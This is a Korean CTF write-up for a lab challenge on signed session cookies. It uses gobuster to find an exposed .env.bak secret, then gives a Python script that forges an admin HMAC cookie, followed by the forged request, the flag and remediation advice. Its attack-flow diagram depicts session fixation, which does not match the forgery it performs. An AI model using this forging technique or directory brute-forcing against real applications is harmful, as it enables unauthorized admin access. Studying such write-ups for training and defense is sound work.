+++
title = "VulnABLE CTF [LUXORA] Write-up: Session Attacks 🥇 Gold"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Session Attack", "Gold", "Signature Forgery", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Session Attacks 🥇 Gold

## 🎯 챌린지 개요
- **카테고리**: Authentication Layer (Session Attacks)
- **난이도**: 🥇 Gold
- **타겟 경로**: `/session/gold`
- **목표**: 서명된 세션(Signed Cookies) 환경에서, 서명 키(Secret) 유출이나 디폴트 키 사용 취약점을 파고들어 세션 데이터(Role)를 변조하고 관리자 권한을 획득하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 인증 방식 분석 (Reconnaissance)

`/session/gold` 페이지에 접속하면 일반 게스트 권한의 세션 쿠키가 발급됩니다.

**[할당된 쿠키 확인]**
```http
Set-Cookie: session=eyJhY2NvdW50X2lkIjo5OTksInJvbGUiOiJndWVzdCJ9.X8bA9Q_uLpW-c; Path=/
```

**[해커의 사고 과정]**
1. 쿠키 값이 두 부분으로 나뉘어 있다. 첫 번째는 `eyJhY...` 이고, 두 번째는 `.` 뒤의 `X8bA...` 이다.
2. 첫 번째 부분을 Base64로 디코딩 해보자.
   ```bash
   $ echo "eyJhY2NvdW50X2lkIjo5OTksInJvbGUiOiJndWVzdCJ9" | base64 -d
   {"account_id":999,"role":"guest"}
   ```
3. 두 번째 부분은 이 JSON 데이터가 변조되지 않았음을 보장하는 **서명(Signature)** 또는 HMAC 해시값일 것이다. (Express.js의 `cookie-signature` 모듈이나 Flask의 Signed Session과 매우 유사함)
4. 만약 내가 Payload의 `role`을 `admin`으로 바꾼 뒤, **"서버가 원래 썼던 방식과 똑같이"** 서명값을 다시 만들어내어 결합한다면 서버를 속일 수 있다.
5. 서명을 만들려면 '비밀키(Secret Key)'가 필요하다. 어디서 이 키를 찾을 수 있을까?

---

## 💥 2. 비밀키(Secret Key) 획득 전략 (Exploitation Strategy)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(Inject Session ID)--> [ Victim's Browser ]
[ Victim ]   --(Logs In)------------> [ Web Server ]
[ Attacker ] --(Uses Same Session)-> [ Web Server ]
                                     |-- Logged in as Victim!
```


비밀키를 찾는 방법은 크게 세 가지입니다.
1. **브루트 포싱 (Brute Force)**: JWT Silver 단계에서 했던 것처럼 사전(Wordlist) 공격을 수행한다.
2. **정보 유출 (Information Leakage)**: GitHub(깃허브), `.git` 폴더, 개발자 코멘트, 혹은 백업 파일(`.bak`, `.env`)을 뒤진다.
3. **디폴트 키 사용 (Default Key)**: 프레임워크 문서에 적힌 기본 예제 키(예: `changeme`, `secret`, `secret_key`)를 그대로 썼을 확률을 믿어본다.

### 💡 정보 유출 탐색 (Directory Brute-forcing)
`gobuster` 나 `dirsearch` 를 돌려 서버의 설정 파일을 찾아봅니다.

```bash
$ gobuster dir -u http://localhost:3000 -w /usr/share/wordlists/dirb/common.txt -x env,bak,txt
```

**[검색 결과]**
```text
/.env.bak (Status: 200)
```

웹 서버 루트에 실수로 남겨둔 백업 환경변수 파일(`.env.bak`)을 찾았습니다! 브라우저로 접속해 내용을 읽어봅니다.

```text
DB_HOST=127.0.0.1
DB_USER=root
SESSION_SECRET=LuxoraS3cr3t2023!
```

---

## 🚀 3. 세션 위조(Forging) 및 공격 수행

비밀키 `LuxoraS3cr3t2023!` 를 알아냈습니다. 이제 파이썬을 이용해 관리자 세션을 직접 찍어냅니다. (Flask의 `itsdangerous` 나 Express의 `cookie-signature` 방식을 가정합니다.)

### 파이썬 익스플로잇 스크립트 작성 (HMAC-SHA256 기반)

```python
import hmac
import hashlib
import base64
import json

# 1. 훔쳐낸 비밀키
secret = b'LuxoraS3cr3t2023!'

# 2. 권한을 상승시킨 페이로드
payload = {"account_id": 1, "role": "admin"}
payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).replace(" ", "").encode()).rstrip(b'=')

# 3. 서명(Signature) 생성
signature = hmac.new(secret, payload_b64, hashlib.sha256).digest()
signature_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=')

# 4. 최종 쿠키 완성 (페이로드.서명)
forged_cookie = payload_b64.decode() + "." + signature_b64.decode()

print("[+] Forged Admin Session Cookie:")
print(forged_cookie)
```

### 위조된 쿠키 전송
스크립트로 생성된 쿠키를 헤더에 얹어 관리자 대시보드(`/session/gold/admin`)로 접근합니다.

```http
GET /session/gold/admin HTTP/1.1
Host: localhost:3000
Cookie: session=eyJhY2NvdW50X2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ.R5tY... (생략)
```

### 🔍 서버의 응답
서버는 자기가 만든 비밀키로 생성된 완벽한 서명을 보고, 의심 없이 세션의 내용을 신뢰합니다.

```html
<h1>Super Admin Portal</h1>
<div class="flag">
  <p>Status: Access Granted.</p>
  <p>FLAG{SESSION_🥇_SIGNATURE_FORGERY_E7F8G9}</p>
</div>
```

---

## 🚩 4. 롸잇업 결론 및 플래그

클라이언트 측 세션(Client-side Session) 기술은 서버 부하를 줄여주지만, 이를 보호하는 비밀키가 유출되는 순간 모든 사용자의 권한을 해커가 마음대로 찍어낼 수 있는 '조폐국' 권한을 넘겨주게 됨을 보여주는 사례입니다.

**🔥 획득한 플래그:**
`FLAG{SESSION_🥇_SIGNATURE_FORGERY_E7F8G9}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
이 취약점은 두 가지 문제의 결합입니다. 하나는 민감한 파일(`.env.bak`)의 웹 디렉터리 노출이고, 다른 하나는 클라이언트 세션 아키텍처의 내재적 위험성입니다.

* **안전한 아키텍처 가이드**
1. **민감 파일 노출 방지**: 웹 루트 디렉터리(Public/HTML 폴더) 안에는 절대로 소스코드 백업본, `.env`, `.git` 폴더가 들어있어선 안 됩니다. 웹 서버(Nginx/Apache) 설정에서 점(`.`)으로 시작하는 파일에 대한 접근을 전면 차단(Deny)해야 합니다.
   ```nginx
   # Nginx: . 로 시작하는 모든 숨김 파일 접근 차단
   location ~ /\. {
       deny all;
   }
   ```
2. **서버 사이드 세션(Server-side Session) 사용 권장**: 클라이언트에 상태(`role: admin`)를 암호화해서 저장하는 것보다는, 클라이언트에게는 난수화된 긴 문자열(Session ID)만 주고 실제 권한 상태는 서버의 DB나 메모리(Redis)에 저장하는 것이 구조적으로 훨씬 안전합니다.